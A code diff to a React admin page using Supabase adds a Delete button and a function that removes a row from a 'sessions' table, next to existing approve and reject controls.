@@ -1,7 +1,7 @@
 import { useState, useEffect, useMemo, useRef, useCallback } from "react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
-import { Lock, CreditCard, CheckCircle, XCircle, KeyRound, Eye, EyeOff, RefreshCw, Activity, Users, Clock, ShieldCheck, ChevronDown, ChevronUp, Mail, MapPin, Hash, Wifi, WifiOff, Volume2, VolumeX } from "lucide-react";
+import { Lock, CreditCard, CheckCircle, XCircle, KeyRound, Eye, EyeOff, RefreshCw, Activity, Users, Clock, ShieldCheck, ChevronDown, ChevronUp, Mail, MapPin, Hash, Wifi, WifiOff, Volume2, VolumeX, Trash2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 import { Badge } from "@/components/ui/badge";
@@ -149,6 +149,16 @@ const Admin = () => {
       toast({ title: "Error", description: "Failed to update session.", variant: "destructive" });
     } else {
       toast({ title: "Updated", description: `Session set to "${status}".` });
+    }
+  };
+
+  const deleteSession = async (id: string) => {
+    const { error } = await supabase.from("sessions").delete().eq("id", id);
+    if (error) {
+      toast({ title: "Error", description: "Failed to delete session.", variant: "destructive" });
+    } else {
+      toast({ title: "Deleted", description: "Session removed." });
+      setExpandedSession(null);
     }
   };
 
@@ -546,6 +556,15 @@ const Admin = () => {
                             onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "rejected"); }}
                           >
                             <XCircle className="h-3.5 w-3.5" /> Reject
+                          </Button>
+                          <div className="flex-1" />
+                          <Button
+                            size="sm"
+                            variant="outline"
+                            className="gap-1.5 text-destructive border-destructive/30 hover:bg-destructive/10"
+                            onClick={(e) => { e.stopPropagation(); deleteSession(s.id); }}
+                          >
+                            <Trash2 className="h-3.5 w-3.5" /> Delete
                           </Button>
                         </div>
                       </div>
